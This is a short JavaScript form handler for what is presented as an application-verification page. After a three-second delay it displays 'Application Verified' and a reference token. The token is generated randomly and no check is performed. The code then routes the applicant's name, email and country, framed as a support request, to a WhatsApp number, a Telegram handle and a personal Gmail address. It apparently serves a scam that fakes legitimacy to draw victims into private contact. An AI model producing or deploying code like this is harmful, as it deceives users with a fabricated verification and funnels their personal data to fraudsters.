<script>
function submitForm() {

  let name = document.getElementById("name").value;
  let email = document.getElementById("email").value;
  let country = document.getElementById("country").value;
  let age = document.getElementById("age").value;
  let reason = document.getElementById("reason").value;

  if(!name || !email || !country || !age || !reason){
    alert("Please complete all required fields");
    return;
  }

  // Processing stage
  document.getElementById("status").innerText =
    "Submitting application for verification...";

  setTimeout(() => {

    // Generate token
    let token = "APP-" + Math.random().toString(36).substring(2, 8).toUpperCase();

    // Show result
    document.getElementById("status").innerText =
      "Application Verified ✔ | Reference ID: " + token;

    // Show support section
    document.getElementById("links").style.display = "block";

    // Build professional support message
    let message =
      "Hello Support Team,%0A%0A" +
      "My application has been successfully processed.%0A%0A" +
      "Full Name: " + name + "%0A" +
      "Email: " + email + "%0A" +
      "Country: " + country + "%0A%0A" +
      "My Reference ID (Token) is: " + token + "%0A%0A" +
      "Kindly proceed with verification. Thank you.";

    // WhatsApp (your number)
    document.getElementById("waLink").href =
      "https://wa.me/18732804513?text=" + message;

    // Telegram (direct channel)
    document.getElementById("tgLink").href =
      "https://t.me/miacwr";

    // Email (pre-filled)
    document.getElementById("mailLink").href =
      "mailto:miacarterxoxo17@gmail.com?subject=Application%20Verification%20Request&body=" + message;

  }, 3000);
}
</script>
